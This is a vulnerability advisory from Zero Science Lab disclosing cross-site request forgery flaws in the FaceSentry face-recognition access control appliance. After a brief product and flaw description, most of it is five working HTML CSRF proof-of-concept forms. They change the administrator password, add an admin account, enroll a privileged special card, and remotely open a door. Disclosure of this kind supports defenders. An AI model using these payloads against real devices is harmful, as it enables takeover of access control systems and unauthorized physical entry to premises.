FaceSentry Access Control System 6.4.8 Cross-Site Request Forgery


Vendor: iWT Ltd.
Product web page: http://www.iwt.com.hk
Affected version: Firmware 6.4.8 build 264 (Algorithm A16)
                  Firmware 5.7.2 build 568 (Algorithm A14)
                  Firmware 5.7.0 build 539 (Algorithm A14)

Summary: FaceSentry 5AN is a revolutionary smart identity
management appliance that offers entry via biometric face
identification, contactless smart card, staff ID, or QR-code.
The QR-code upgrade allows you to share an eKey with guests
while you're away from your Office and monitor all activity
via the web administration tool. Powered by standard PoE
(Power over Ethernet), FaceSEntry 5AN can be installed in
minutes with only 6 screws. FaceSentry 5AN is a true enterprise
grade access control or time-and-attendance appliance.

Desc: The application interface allows users to perform certain
actions via HTTP requests without performing any validity checks
to verify the requests. This can be exploited to perform certain
actions with administrative privileges if a logged-in user visits
a malicious web site.

Tested on: Linux 4.14.18-sunxi (armv7l) Ubuntu 16.04.4 LTS (Xenial Xerus)
           Linux 3.4.113-sun8i (armv7l)
           PHP/7.0.30-0ubuntu0.16.04.1
           PHP/7.0.22-0ubuntu0.16.04.1
           lighttpd/1.4.35
           Armbian 5.38
           Sunxi Linux (sun8i generation)
           Orange Pi PC +


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2019-5524
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5524.php


28.05.2019

--


CSRF change administrator password:
-----------------------------------
<html>
  <body>
  <script>history.pushState('', 'CSRF', 'sentryInfo.php')</script>
    <form action="http://192.168.11.1/personalSetting.php" method="POST">
      <input type="hidden" name="strInAction" value="updateUser" />
      <input type="hidden" name="strInUserID" value="administrator" />
      <input type="hidden" name="isChangePwd" value="1" />
      <input type="hidden" name="strInLanguage" value="Eng" />
      <input type="hidden" name="strInPassword" value="t00tw00t />
      <input type="hidden" name="strInConfirmPassword" value="t00tw00t" />
      <input type="submit" value="Submit" />
    </form>
  </body>
</html>


CSRF add admin:
---------------
<html>
  <body>
  <script>history.pushState('', 'CSRF', 'sentryInfo.php')</script>
    <form action="http://192.168.11.1/userList.php?" method="POST">
      <input type="hidden" name="strInAction" value="addUser" />
      <input type="hidden" name="strInUserID" value="Testinugs" />
      <input type="hidden" name="strInUserFunctionPermissionGroupID" value="Admin" />
      <input type="hidden" name="strInDescription" value="CSRFd" />
      <input type="hidden" name="strInLanguage" value="Eng" />
      <input type="hidden" name="strInPassword" value="123123" />
      <input type="hidden" name="strInConfirmPassword" value="123123" />
      <input type="hidden" name="strInStatus" value="Active" />
      <input type="submit" value="Submit" />
    </form>
  </body>
</html>


Change administrator password via different path:
-------------------------------------------------
<html>
  <body>
  <script>history.pushState('', 'CSRF', 'sentryInfo.php')</script>
    <form action="http://192.168.11.1/userList.php?" method="POST">
      <input type="hidden" name="strInAction" value="updateUser" />
      <input type="hidden" name="strInPageNo" value="0" />
      <input type="hidden" name="strInUserID" value="administrator" />
      <input type="hidden" name="isChangePwd" value="1" />
      <input type="hidden" name="strInDescription" value="Default&#32;Sys&#46;&#32;Admin" />
      <input type="hidden" name="strInUserFunctionPermissionGroupID" value="Admin" />
      <input type="hidden" name="strInLanguage" value="Eng" />
      <input type="hidden" name="strInStatus" value="Active" />
      <input type="hidden" name="strInPassword" value="123456" />
      <input type="hidden" name="strInConfirmPassword" value="123456" />
      <input type="hidden" name="strEditPageNo" value="" />
      <input type="submit" value="Submit" />
    </form>
  </body>
</html>


Add special card:
-----------------
<html>
  <body>
  <script>history.pushState('', 'CSRF', 'sentryInfo.php')</script>
    <form action="http://192.168.11.1/specialCard.php?" method="POST">
      <input type="hidden" name="strInSpecialCardID" value="deadbeef" />
      <input type="hidden" name="strInSpecialCardStatus" value="" />
      <input type="hidden" name="strInSpecialCardEnrollHigh" value="1" />
      <input type="hidden" name="strInSpecialCardEnrollLow" value="1" />
      <input type="hidden" name="strInSpecialCardRescue" value="1" />
      <input type="hidden" name="strInSpecialCardOpenDoor" value="1" />
      <input type="hidden" name="strInSpecialCardReboot" value="1" />
      <input type="hidden" name="strInSpecialCardShutDown" value="1" />
      <input type="hidden" name="strInAction" value="addNewSpecialCard" />
      <input type="hidden" name="strInPageNo" value="0" />
      <input type="hidden" name="strEditPageNo" value="" />
      <input type="hidden" name="strInNewSpecialCard" value="deadbeef" />
      <input type="submit" value="Submit" />
    </form>
  </body>
</html>


CSRF open door 0:
-----------------
<html>
  <body>
  <script>history.pushState('', 'CSRF', 'sentryInfo.php')</script>
    <form action="http://192.168.11.1/openDoor.php?" method="POST">
      <input type="hidden" name="strInAction" value="openDoor" />
      <input type="hidden" name="strInPageNo" value="0" />
      <input type="hidden" name="strInRestartAction" value="" />
      <input type="hidden" name="strPanelIDRestart=" value="" />
      <input type="hidden" name="strPanelRestartAction" value="" />
      <input type="submit" value="Submit" />
    </form>
  </body>
</html>